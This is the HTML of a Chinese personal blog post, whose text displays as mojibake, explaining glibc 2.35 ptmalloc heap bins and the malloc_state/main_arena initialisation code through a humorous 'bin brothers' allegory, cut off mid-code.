<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"ä¸‡ä¸€æ‰¾åˆ°äº†å‘¢","hits_empty":"ä½ è¯´çš„ ${query} æˆ‘æ€ä¹ˆæ‰¾ä¸ç€å‘¢ ","hits_stats":"æ‰¾åˆ°äº† ${hits} ä¸ªç»“æœï¼Œç”¨æ—¶ ${time} æ¯«ç§’"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="çœ‹çœ‹ä½ çš„æ–Œ 11æœˆ8æ—¥çš„æ¢¦ 11.8ç¡åˆ°ä¸‹åˆ1ç‚¹æ‰é†’,åšäº†ä¸€ä¸ªç‰¹åˆ«æ²™é›•çš„æ¢¦ å°æ—¶å€™ä¸Šçš„å•æ‰€é•¿è¿™æ ·,ä¸¤ä¸ªé«˜å°ä¸­é—´ä¸€ä¸ªå‘é“   9320d00da5b65e5f8474bda8f6e876a  è¦ä¹ˆç«™åœ¨ä¸€ä¾§å°¿, è¦ä¹ˆè·¨è¹²æ‹‰ æˆ‘æ¢¦é‡Œä¸Šäº†ä¸ªå•æ‰€,è¿™ä¸ªå•æ‰€çš„å‘é“å¾ˆå®½,ä¸€ç±³ æˆ‘ä¸Šå»å‡ ä¹è¦åŠˆå‰,æœ¬æ¥ä¸æƒ³è·¨è¹²çš„ ä½†æ˜¯æ—è¾¹å¥½å‡ ä¸ªå°æœ‹å‹ æˆ‘ç«‹åˆ»å°±è·¨è¹²,å°æœ‹å‹å°±è·Ÿç€å­¦ ç„¶åå°±éƒ½æ‰ä¸‹å»äº†,ç„¶åå°">
<meta property="og:type" content="article">
<meta property="og:title" content="heap bins">
<meta property="og:url" content="http://deutschball.github.io/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="çœ‹çœ‹ä½ çš„æ–Œ 11æœˆ8æ—¥çš„æ¢¦ 11.8ç¡åˆ°ä¸‹åˆ1ç‚¹æ‰é†’,åšäº†ä¸€ä¸ªç‰¹åˆ«æ²™é›•çš„æ¢¦ å°æ—¶å€™ä¸Šçš„å•æ‰€é•¿è¿™æ ·,ä¸¤ä¸ªé«˜å°ä¸­é—´ä¸€ä¸ªå‘é“   9320d00da5b65e5f8474bda8f6e876a  è¦ä¹ˆç«™åœ¨ä¸€ä¾§å°¿, è¦ä¹ˆè·¨è¹²æ‹‰ æˆ‘æ¢¦é‡Œä¸Šäº†ä¸ªå•æ‰€,è¿™ä¸ªå•æ‰€çš„å‘é“å¾ˆå®½,ä¸€ç±³ æˆ‘ä¸Šå»å‡ ä¹è¦åŠˆå‰,æœ¬æ¥ä¸æƒ³è·¨è¹²çš„ ä½†æ˜¯æ—è¾¹å¥½å‡ ä¸ªå°æœ‹å‹ æˆ‘ç«‹åˆ»å°±è·¨è¹²,å°æœ‹å‹å°±è·Ÿç€å­¦ ç„¶åå°±éƒ½æ‰ä¸‹å»äº†,ç„¶åå°">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-11-23T13:31:00.000Z">
<meta property="article:modified_time" content="2024-11-23T13:35:17.510Z">
<meta property="article:author" content="dustball">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>heap bins | dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          heap bins
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-11-23 21:31:00 / Modified: 21:35:17" itemprop="dateCreated datePublished" datetime="2024-11-23T21:31:00+08:00">2024-11-23</time>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="çœ‹çœ‹ä½ çš„æ–Œ">çœ‹çœ‹ä½ çš„æ–Œ</h1>
<h2 id="æœˆ8æ—¥çš„æ¢¦">11æœˆ8æ—¥çš„æ¢¦</h2>
<p>11.8ç¡åˆ°ä¸‹åˆ1ç‚¹æ‰é†’,åšäº†ä¸€ä¸ªç‰¹åˆ«æ²™é›•çš„æ¢¦</p>
<p>å°æ—¶å€™ä¸Šçš„å•æ‰€é•¿è¿™æ ·,ä¸¤ä¸ªé«˜å°ä¸­é—´ä¸€ä¸ªå‘é“</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/9320d00da5b65e5f8474bda8f6e876a.jpg"
alt="9320d00da5b65e5f8474bda8f6e876a" />
<figcaption
aria-hidden="true">9320d00da5b65e5f8474bda8f6e876a</figcaption>
</figure>
<p>è¦ä¹ˆç«™åœ¨ä¸€ä¾§å°¿, è¦ä¹ˆè·¨è¹²æ‹‰</p>
<p>æˆ‘æ¢¦é‡Œä¸Šäº†ä¸ªå•æ‰€,è¿™ä¸ªå•æ‰€çš„å‘é“å¾ˆå®½,ä¸€ç±³</p>
<p>æˆ‘ä¸Šå»å‡ ä¹è¦åŠˆå‰,æœ¬æ¥ä¸æƒ³è·¨è¹²çš„</p>
<p><strong>ä½†æ˜¯æ—è¾¹å¥½å‡ ä¸ªå°æœ‹å‹</strong></p>
<p>æˆ‘ç«‹åˆ»å°±è·¨è¹²,å°æœ‹å‹å°±è·Ÿç€å­¦</p>
<p>ç„¶åå°±éƒ½æ‰ä¸‹å»äº†,ç„¶åå°æœ‹å‹å°±æººæ°´</p>
<p>æˆ‘æ­£å¥½åœ¨æ°´æµä¸Šæ¸¸</p>
<p>çˆ½æ­»æˆ‘äº†</p>
<p>æˆ‘åœ¨ä¸Šæ¸¸å¯åŠ²å„¿é€ çŸ¢</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241108150444057.png"
alt="image-20241108150444057" />
<figcaption aria-hidden="true">image-20241108150444057</figcaption>
</figure>
<h2 id="æ–Œå®¶ã®æ•…äº‹">æ–Œå®¶ã®æ•…äº‹</h2>
<p>ä¹±æ–Œ,å°æ–Œ,å¤§æ–Œæ˜¯æ–Œå®¶ä¸‰å…„å¼Ÿ,åŒå¤„ä¸€ä¸ªå±‹æªä¸‹</p>
<p>å¿«æ–Œæ˜¯å”è¾ˆå…„å¼Ÿ,è‡ªå·±å¦ä½</p>
<p>è¿™å››ä¸ªå‚»æ–Œå„è‡ªå¼€äº†ä»£é”€å¤„,
è´Ÿè´£å€’å–ä¸€ç§å«åš<strong>å †å—</strong>çš„è´§ç‰©</p>
<p>æœ€åˆæ–Œå®¶æ˜¯ä¸€ç©·äºŒç™½çš„,
å®¢æˆ·åªèƒ½å»<strong>å¤´å—æ‰¹å‘å¸‚åœº</strong>äº²è‡ªæ‹¿è´§</p>
<p>å®¢æˆ·ç”¨å®Œäº†çš„è´§, æ–Œå®¶é—»ç€å‘³å„¿å°±æ¥æ‹¾ç ´çƒ‚å„¿äº†</p>
<p>å¿«æ–Œæ€§å­å¾ˆæ€¥, å–œæ¬¢ç›´æ¥æŠ¢. å¿«æ–Œä¸æ»¡è¶³çš„è¯, æ˜¯è½®ä¸åˆ°æ–Œå®¶ä¸‰å…„å¼Ÿçš„</p>
<p>å‰©ä¸‹æ–Œå®¶ä¸‰å…„å¼Ÿä¸­, ä¹±æ–Œè´Ÿè´£è¿›è´§, æ‹¿å›æ¥åå’Œå¤§æ–Œå°æ–Œåˆ†è´§</p>
<p>å¿«æ–Œæ€§å­å¾ˆæ€¥, ç®¡ç†è´§ç‰©ç®€å•ç²—æš´ä½†æ˜¯é¢‡å…·æ¡ç†, ä»–æ‰¾äº†10ä¸ªæ¡©,
æ¯ä¸ªæ¡©ä¸Šç”¨é“é“¾æ‹´å¤§å°ä¸€æ ·çš„è´§, æ “äº†10é•¿ä¸²</p>
<p>ä¹±æ–Œéå¸¸ä¸æ¡ç†, ä»–è‡ªå·±çš„è´§éšä¾¿ä¹±æ”¾, æ¯æ¬¡æ‰¾è´§éƒ½å¾—æ‰’ç¿»åŠå¤©,
ç”¨å±±ä¸œè¯è¯´å°±æ˜¯å±‘åŒ…è›‹</p>
<p>å°æ–Œå°±æ¯”è¾ƒæ¡ç†, ä»–æŒ‰ç…§è´§ç‰©å¤§å°æŠŠè´§åˆ†æˆäº†62ä¸ªç®±å­,
æ¯ä¸ªç®±å­é‡Œæ”¾å¤§å°ç›¸è¿‘çš„è´§</p>
<p>å¤§æ–Œæœ€æ¡ç†,ä»–ä¸å…‰åˆ†äº†63ä¸ªç®±å­æ”¾å¤§å°ç›¸è¿‘çš„è´§,
å¦‚æœå°ç®±å­ç©ºäº†ä»–è¿˜ä¼šä»å¤§ç®±å­é‡Œæ‹¿å¤§è´§æ‹†å°ç„¶åæ”¾åˆ°å°ç®±å­</p>
<p>å› æ­¤ä¹±æ–ŒçŸ¥é“è‡ªå·±ä¸æ˜¯ç†è´§çš„æ–™å„¿, ä¼šåŠæ—¶æŠŠè´§åˆ†ç»™å¤§å°æ–Œç®¡ç†,
è‡ªå·±é›†ä¸­ç²¾åŠ›è¿›è´§</p>
<p>ä½†æ˜¯ç”±äºå¿«æ–Œå–œæ¬¢æŠ¢ä¸œè¥¿, å¥½ç«¯ç«¯çš„å¤§è´§å¯èƒ½è¢«ä»–æŠ¢æˆå¥½å‡ ä¸ªå°è´§,
è¿™æ—¶å€™å¦‚æœå®¢æˆ·æ¥è¦å¤§è´§, å››ä¸ªæ–Œè°ä¹Ÿæ‹¿ä¸å‡ºæ¥, ä¹Ÿå°±æ˜¯å½¢æˆäº†å¤–éƒ¨ç¢ç‰‡</p>
<p>è¿™å°±å°´å°¬äº†, ä»€ä¹ˆæ–Œå®¶å››é£èˆ</p>
<p>å› æ­¤å¿«æ–Œä¼šåœ¨æ­¤æ—¶è¢«åˆ¶è£, ä¹–ä¹–äº¤å‡ºæ‰€æœ‰è´§ç‰©ç»„æˆå¤§è´§ç»™å®¢æˆ·</p>
<p>ç„¶è€Œæœ‰ä¸€å¤©å®¢æˆ·å«Œæ–Œå®¶å››å…„å¼Ÿå¤ªé£èˆäº†,
å¦æ‰¾äº†ä¸ªæ“¦è½¦æ–Œ(ä¸‹ç®€ç§°æ“¦æ–Œ)ä½œä»£ç†å•†</p>
<p>æ“¦æ–Œæ¯”å¿«æ–Œè¿˜æ€¥, æ€¥å¾—è·ŸğŸä¸€æ ·, å¿«æ–Œéƒ½æŠ¢ä¸è¿‡ä»–</p>
<p>è¿™ä¸€ä¸‹å­è€æ–Œå®¶çš„ç”Ÿæ„æƒ¨æ·¡äº†è®¸å¤š</p>
<p><strong>æ ¼ç«‹åŒ—å…‹</strong>å¸å›½å¸å–äº†å¿«æ–Œä¹±æŠ¢çš„æ•™è®­, æäº†ä¸ªåå„æ–­,
å‰ä¸ƒä¸ªè´§è®©ç»™æ“¦è½¦æ–Œ, ä¹‹åçš„è´§è¿˜æ˜¯ç”±è€æ–Œå®¶ç»è¥</p>
<p>å›¾å·çš„pwncollege</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png"
alt="malloc beyond tcache" />
<figcaption aria-hidden="true">malloc beyond tcache</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png"
alt="free beyond tcache" />
<figcaption aria-hidden="true">free beyond tcache</figcaption>
</figure>
<p>æœ¬æ–‡å‚è€ƒGlibc2.35</p>
<h2 id="meta-meta-data">meta-meta-data</h2>
<p>æœ¬èŠ‚ä»‹ç»å…ƒæ•°æ®çš„å…ƒæ•°æ®,ä¹Ÿå°±æ˜¯æ•´ä¸ª<code>ptmalloc</code>çš„å®è§‚ç»“æ„,ä¹Ÿå°±æ˜¯æ–Œã®å®¶</p>
<p>æ›´å…·ä½“çš„è¯´å°±æ˜¯å¦‚ä¸‹ä¸¤ä¸ªç»“æ„</p>
<table>
<colgroup>
<col style="width: 15%" />
<col style="width: 71%" />
<col style="width: 13%" />
</colgroup>
<thead>
<tr>
<th>ç»“æ„ä½“</th>
<th>ä½œç”¨</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>malloc_state</td>
<td>åˆ†é…åŒº,ç®¡ç†fastbins,binsç­‰å…ƒæ•°æ®</td>
<td><strong>é‡è¦</strong></td>
</tr>
<tr>
<td>malloc_par</td>
<td>åˆ†é…åŒºé…ç½®æ–‡ä»¶,è®°å½•tcacheæ¡¶å­å®¹é‡,æœ€å¤§å—å¤§å°ç­‰é…ç½®ä¿¡æ¯</td>
<td>ä¸æ˜¯å¾ˆé‡è¦</td>
</tr>
</tbody>
</table>
<h3 id="malloc_state">malloc_state</h3>
<p><code>malloc_state</code>æ˜¯<code>ptmalloc</code>ä¸­çš„å®è§‚å…ƒæ•°æ®ç»“æ„,
å…¶å¯¹è±¡è¢«ç§°ä¸ºâ€œåˆ†é…åŒºâ€,æ¯”å¦‚<code>main_arena</code>å°±æ˜¯<strong>ä¸»åˆ†é…åŒº</strong></p>
<p>åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­,å¯èƒ½å­˜åœ¨å¤šä¸ªåˆ†é…åŒº,ä»¥åº”å¯¹å¹¶å‘çš„åˆ†é…è¯·æ±‚</p>
<p>ç®¡ç†ç€å„ç§<code>bins</code>çš„å…ƒæ•°æ®ä¿¡æ¯,æ¯”å¦‚é“¾è¡¨é™„åŠ å¤´èŠ‚ç‚¹çš„ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];			<span class="comment">//fastbins</span></span><br><span class="line"></span><br><span class="line">    mchunkptr top;								<span class="comment">//topchunk</span></span><br><span class="line"></span><br><span class="line">    mchunkptr last_remainder;					<span class="comment">//æœ€è¿‘ä¸€æ¬¡åˆ†é…å‰©ä¸‹çš„å †å—æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];			</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>					<span class="comment">//ä¸‹ä¸€ä¸ªmalloc_state</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bins[0]</span><br><span class="line">bins[1] =&gt; unsorted bin</span><br><span class="line">bins[2:63] =&gt; small bins</span><br><span class="line">bins[64:126] =&gt; large bins</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>fastbins</code>æ˜¯<code>bins</code>çš„ç¼“å­˜,ç±»ä¼¼äº<code>tcache</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ä¸»åˆ†é…åŒº(<code>main_arena</code>)æ˜¯<code>malloc_state</code>çš„ä¸€ä¸ªå®ä¾‹,æ˜¯ä¸€ä¸ª<code>glibc</code>çš„<code>static</code>å¯¹è±¡</p>
<p>é»˜è®¤æƒ…å†µä¸‹è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹,ä¹Ÿå°±ä¸ä¼šæœ‰å¹¶å‘çš„åŠ¨æ€åˆ†é…è¯·æ±‚,é‚£ä¹ˆåªéœ€è¦æœ‰ä¸€ä¸ªåˆ†é…åŒº,ä¹Ÿå°±æ˜¯<code>main_arena</code></p>
<p>åœ¨<code>glibc</code>åŠ è½½è¿›å…¥å†…å­˜ä¹‹å,<code>main_arena</code>è¢«åˆ›å»º,å¹¶ä¸”åˆæ­¥ç²—ç•¥åœ°åˆå§‹åŒ–ä¸€ä¸‹,</p>
<p>å¯¹å„ä¸ª<code>bins</code>çš„åˆå§‹åŒ–éœ€è¦ç­‰<code>malloc_init_state</code>è¢«è°ƒç”¨,è¯¥å‡½æ•°ä¼šåœ¨é¦–æ¬¡åŠ¨æ€åˆ†é…å‰è°ƒç”¨</p>
<p>å¦‚æœæœ‰å¤šæ¡çº¿ç¨‹</p>
<p>é‚£ä¹ˆå°±å¯èƒ½æœ‰å¤šä¸ªåˆ†é…åŒº,å„ä¸ªåˆ†é…åŒºé€šè¿‡<code>next</code>æŒ‡é’ˆç»„æˆç¯çŠ¶å•é“¾è¡¨,</p>
<p>åœ¨åº”å¯¹å¹¶å‘çš„åŠ¨æ€åˆ†é…è¯·æ±‚æ—¶,ä¼šæ²¿ç€<code>next</code>æŒ‡é’ˆæ‰¾åˆ°ä¸€ä¸ªç©ºé—²çš„åˆ†é…åŒºæ»¡è¶³éœ€æ±‚</p>
<p><strong>ä¸»åˆ†é…åŒºåˆå§‹åŒ–å‘ç”Ÿæ—¶æœº</strong></p>
<p><code>init</code>é‡‡å–æ‡’åŠ è½½æœºåˆ¶,åªä¼šåœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨åˆ°åŠ¨æ€åˆ†é…å‡½æ•°å¦‚<code>malloc</code>æˆ–è€…<code>calloc</code>ç­‰æ—¶æ‰ä¼šè¢«è°ƒç”¨</p>
<p><code>printf</code>ç­‰ä¸€äº›<code>I/O</code>å‡½æ•°ä¹Ÿä¼šè°ƒç”¨åˆ°<code>malloc</code>ç”³è¯·ç¼“å†²åŒº,å¯¼è‡´<code>init</code>å‘ç”Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)			<span class="comment">//åˆå§‹åŒ–æ•´ä¸ªptmallocå †ç®¡ç†å™¨</span></span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized)				<span class="comment">//é¿å…é‡è£…</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="literal">true</span>;			<span class="comment">//æ ‡è®°å·²ç»åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize ();				<span class="comment">//æ­¤å¤„åˆå§‹åŒ–tcache key, è¯¥keyç”¨æ¥ç¼“è§£double free</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;			<span class="comment">//ä¸»åˆ†é…åŒº(main_arena)æ˜¯ä¸€ä¸ªstaticæ¨¡å—å˜é‡</span></span><br><span class="line">	</span><br><span class="line">  malloc_init_state (&amp;main_arena);		<span class="comment">//å¯¹ä¸»åˆ†é…åŒºè¿›è¡Œåˆå§‹åŒ–</span></span><br></pre></td></tr></table></figure>
<p><strong>ä¸»åˆ†é…åŒºåˆå§‹åŒ–å†…å®¹</strong></p>
<p>1.<code>bins</code> çš„æ¯ä¸ªå¤´åˆå§‹åŒ–æŒ‡å‘è‡ªå·±,è¡¨ç¤ºæ¡¶å­é‡Œæ²¡æœ‰ç©ºé—²å †å—</p>
<p>2.<code>[ä¸»å…¬æŠ€][é”å®šæŠ€]</code>å¯¹<code>main_arena</code>è®¾ç½®<code>fastbins</code>æœ€å¤§å †å—å¤§å°ä¸è¶…è¿‡<code>0x80</code>
(åŒ…å«å…ƒæ•°æ®)</p>
<p>3.åˆå§‹åŒ–<code>topchunk</code>æ¡¶å­å¤´æŒ‡å‘<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    mbinptr bin;</span><br><span class="line"></span><br><span 